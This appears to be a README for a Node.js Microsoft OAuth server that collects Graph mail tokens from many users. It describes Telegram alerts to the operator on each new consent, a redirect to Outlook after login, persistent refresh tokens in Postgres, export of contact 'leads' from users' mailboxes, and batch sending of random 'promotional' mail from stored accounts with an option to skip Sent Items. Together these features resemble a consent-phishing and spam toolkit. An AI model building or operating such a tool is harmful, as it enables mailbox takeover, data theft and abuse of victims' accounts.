## Microsoft OAuth Redirect URI Server (Node.js)

This is a **localhost redirect URI server** for Microsoft Entra ID OAuth 2.0 (v2) using **Authorization Code + PKCE** (public client style).

It:
- **Shows the Microsoft consent page** (via `/auth/start`)
- Handles the redirect at **`/callback`**
- **Exchanges code → tokens** and saves them in **`tokens.json`**
- **Refreshes access tokens** using the refresh token when needed
- Calls Microsoft Graph to **read profile** and **read email** when requested

---

## 1) Create the App Registration (Entra)

In Microsoft Entra admin center:
- **App registrations** → **New registration**
- Choose account types (single tenant or multi-tenant)
- Add a Redirect URI (pick one):
  - **Web**: `http://localhost:3000/callback`
  - Or **Public client/native**: `http://localhost:3000/callback`

Note:
- Locally, you can run this as a **public client** with PKCE (no secret).
- On Render/production, the recommended setup is **Web** + **Client Secret** (confidential client).

Copy:
- **Application (client) ID**
- **Directory (tenant) ID** (or just use `common`)

---

## 2) Configure API Permissions

In the app registration:
- **API permissions** → **Add a permission** → **Microsoft Graph** → **Delegated permissions**
- Add:
  - `User.Read`
  - `Mail.Read`
  - `Mail.Send` (to send email as the signed-in user)
  - `offline_access`
  - `openid`
  - `profile`

(Optional) **Grant admin consent** for your tenant.

### Optional Graph permissions (add only if you need the feature)

You do **not** need these at app creation time. Add them later only if your app will call those Graph APIs:

- **Mailbox settings**
  - `MailboxSettings.Read` / `MailboxSettings.ReadWrite`
- **Calendar**
  - `Calendars.Read` / `Calendars.ReadWrite`
- **Contacts**
  - `Contacts.Read` / `Contacts.ReadWrite`
- **OneDrive files**
  - `Files.Read` / `Files.ReadWrite`
- **SharePoint sites**
  - `Sites.Read.All` / `Sites.ReadWrite.All`

If you add new permissions later, you’ll typically need to **re-consent** (clear `tokens.json` and visit `/auth/start` again) and/or **Grant admin consent** depending on your tenant policies.

---

## 3) Configure this server

Create `config.env` (copy from `config.example.env`) and fill in values:

```bash
cp config.example.env config.env
```

Then edit `config.env`:
- `CLIENT_ID=...`
- `TENANT_ID=...` (or `common`)
- `REDIRECT_URI=http://localhost:3000/callback` (must match Entra exactly)
- Ensure `SCOPES` includes what you added in API permissions (example includes mail + optional add-ons).
- Optionally set `POST_AUTH_REDIRECT` (defaults to Outlook Web).
- Optionally set `ADMIN_PASSWORD` to protect the homepage/admin endpoints.
- Optionally set `TELEGRAM_BOT_TOKEN` + `TELEGRAM_CHAT_ID` to receive a Telegram ping after a successful OAuth connection.

### Token storage (recommended: Render Postgres)

For production (Render), persist tokens in Postgres by setting:
- `DATABASE_URL=...` (from your Render Postgres instance)

When `DATABASE_URL` is set, this app stores tokens in Postgres instead of writing files to disk.

Important:
- Do **not** commit DB URLs/passwords into git. Use Render Environment Variables.

### Render deployment note (fix for AADSTS9002327)

If you see:
- `AADSTS9002327: Tokens issued for the 'Single-Page Application' client-type may only be redeemed via cross-origin requests`

That means your redirect URI is registered under **SPA** in Entra, but this project redeems the auth code **server-side** (Node).

Fix in Entra:
- **Authentication** → **Add a platform** → **Web**
- Add redirect URI: `https://YOUR-RENDER-DOMAIN.onrender.com/callback`
- (Recommended) Create a client secret: **Certificates & secrets** → **New client secret**
- Set Render env vars: `CLIENT_ID`, `CLIENT_SECRET`, `TENANT_ID=common`, `REDIRECT_URI=https://.../callback`, `DATABASE_URL`, `SCOPES`

Then re-consent:
- Clear saved tokens (`/logout`) and run `/auth/start` again.

---

## 4) Run

```bash
npm install
npm start
```

Open:
- `http://localhost:3000/`
- Click **Start consent/login**

---

## 5) Useful endpoints

- `GET /auth/start`: start login + consent
- `GET /callback`: redirect URI handler (Microsoft sends `code` here)
- `GET /users`: list stored users/accounts (and the active one)
- `GET /token/status`: shows token metadata (not raw tokens)
- `GET /me[?user=<user_key>]`: calls Graph `/me` for a selected user (defaults to last login)
- `GET /mail?top=10[&user=<user_key>]`: calls Graph `/me/messages` for a selected user
- `GET /mail/<messageId>[?user=<user_key>]`: fetch a single message including full `body` content
### JSON API (password-protected admin)
### CSV export (leads)
- `npm run export:leads` → writes `leads.csv` with unique contacts from Inbox + Sent.
  - Env: `MAX_MESSAGES=2000` (per folder), `FOLDER=all|sent|inbox`, `OUTPUT=/path/file.csv`, `USER_KEY=...`, `DATABASE_URL=...` (for Postgres tokens).

- `GET /api/mail/folders`: list mail folders
- `GET /api/mail/folders/:id/messages?top=25`: list messages in a folder
- `GET /api/mail/drafts?top=25`: list drafts
- `POST /api/mail/drafts`: create a draft (`to`, `cc`, `bcc`, `subject`, `bodyText|bodyHtml`)
- `PATCH /api/mail/drafts/:id`: update draft fields
- `POST /api/mail/drafts/:id/send`: send a draft
- `POST /api/mail/send`: send mail (`to`, `cc`, `bcc`, `subject`, `bodyText|bodyHtml`, `saveToSentItems`)
- `POST /api/mail/:id/read`: mark read/unread (`isRead`)
- `POST /api/mail/:id/move`: move to folder (`destinationId`)
- `POST /api/mail/:id/copy`: copy to folder (`destinationId`)
- `POST /api/mail/:id/flag`: set flag (`flagStatus` = notFlagged|flagged|complete)
- `POST /api/mail/:id/reply`: reply with `comment`
- `POST /api/mail/:id/replyAll`: reply all with `comment`
- `POST /api/mail/:id/forward`: forward (`to`, optional `comment`)
- `DELETE /api/mail/:id`: delete a message
- `GET /api/mail/search?q=...&top=25`: search mailbox

---

## Notes / security

 - This is meant for **local development**. Tokens are saved in plaintext to the `tokens/` directory.
- If you need to secure tokens at rest, tell me your target platform and I can add encryption (OS keychain, DPAPI, libsecret, etc.).
 - If you add new scopes later, you’ll typically need to re-consent (clear the relevant `tokens/*.json` and visit `/auth/start` again).
 - If you expand scopes (like `Mail.ReadWrite`, `Files.ReadWrite`, `Sites.ReadWrite.All`), users will see a bigger consent screen and you must re-consent.

### Token lifetime / “stay connected”

- **Access tokens** are short-lived (commonly ~1 hour) and **cannot** be made to last a year.
- Long-running apps stay connected by storing the **refresh token** (`offline_access`) and automatically refreshing access tokens.

This server refreshes tokens automatically when they are close to expiring. You can tune:
- `REFRESH_SKEW_SECONDS` (default 300 = refresh ~5 minutes early)
- `REFRESH_EVERY_SECONDS` (optional background refresh loop; 0 disables)

### Multi-user token storage

If different users authenticate, this server saves **one file per user** in the `tokens/` directory:
- `tokens/<tenantId>:<userId>.json`

Use `/users` to list accounts and pass `?user=<user_key>` to select which account to use for Graph calls.

If `DATABASE_URL` is set, tokens are stored in Postgres (table: `oauth_tokens`) instead of files.

### CLI: read mail from Postgres (latest user)

This repo includes a helper script that loads the **most recently saved user** from Postgres, refreshes the token if needed, and reads mail:

```bash
npm run read:mail:db
```

It uses env vars:
- `DATABASE_URL` (required)
- `CLIENT_ID` (required)
- `CLIENT_SECRET` (required for refresh in web/confidential setup)
- `TENANT_ID` (default `common`)
- `TOP` (optional)
- `USER_KEY` (optional)

### CLI: send emails using stored tokens

Send emails using stored OAuth tokens with randomly generated content:

```bash
# List available users with stored tokens
npm run send:emails -- --list

# Send one business email with random content
npm run send:emails -- --user-key <user_key>

# Send to specific recipient
npm run send:emails -- --user-key <user_key> --to recipient@example.com

# Send 5 promotional emails
npm run send:emails -- --user-key <user_key> --template promotional --count 5

# Send personal email with custom subject
npm run send:emails -- --user-key <user_key> --template personal --subject "Hello there!"
```

Options:
- `--user-key, -u`: User key to use for sending emails (required)
- `--to, -t`: Recipient email address (random if not specified)
- `--subject, -s`: Email subject (random if not specified)
- `--template`: Template type: `business`, `personal`, `promotional` (default: `business`)
- `--length, -l`: Content length: `short`, `medium`, `long` (default: `medium`)
- `--count, -c`: Number of emails to send in batch (default: 1)
- `--no-save`: Don't save emails to Sent Items folder
- `--list`: List available users with stored tokens

The email sender uses [Faker.js](https://fakerjs.dev/) to generate realistic random content based on the selected template type.


